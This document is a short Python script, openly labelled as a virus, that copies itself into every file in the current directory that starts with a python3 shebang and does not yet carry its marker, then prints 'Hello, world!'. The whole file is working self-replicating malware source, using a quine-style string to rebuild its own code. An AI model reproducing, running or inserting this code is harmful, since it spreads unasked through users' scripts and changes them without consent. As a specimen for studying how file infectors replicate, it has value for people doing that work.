#!/bin/python3
#I CAN HAS VIRUS#
virus_marker = "#I CAN HAS VIRUS#"
virus_block = '''
virus_marker = "#I CAN HAS VIRUS#"
virus_block = {0}{0}{0}{1}{0}{0}{0}

import sys
import os
def infect(file_name,virus,virus_marker):
    with open(file_name,"r+") as fd:
        start = fd.readline(15);
        if start.rstrip() != "#!/bin/python3":
            return
        marker = fd.readline()
        if marker.rstrip() == virus_marker:
            return
    with open(file_name,"r+") as fd:
        contents = fd.readlines()
        contents[1:1] = virus
    with open(file_name, "w") as fd:
        contents = "".join(contents)
        fd.write(contents)
def virus():
    virus_code = virus_block.format(chr(39),virus_block.replace(chr(10), chr(92) + "n"))
    files = os.listdir(".")
    for i in files:
        infect(i,virus_code,virus_marker)
virus()'''

import sys
import os
def infect(file_name,virus,virus_marker):
    with open(file_name,"r+") as fd:
        start = fd.readline(15);
        if start != "#!/bin/python3\n":
            return
        marker = fd.readline()
        if marker.rstrip() == virus_marker:
            return
    with open(file_name,"r+") as fd:
        contents = fd.readlines()
        contents[1:1] = virus
        contents[1:1] = virus_marker + chr(10)
    with open(file_name, "w") as fd:
        fd.write("".join(contents))
def virus():
    virus_code = virus_block.format(chr(39),virus_block.replace(chr(10), chr(92) + "n"))
    files = os.listdir(".")
    for i in files:
        infect(i,virus_code,virus_marker)

virus()

print("Hello, world!")
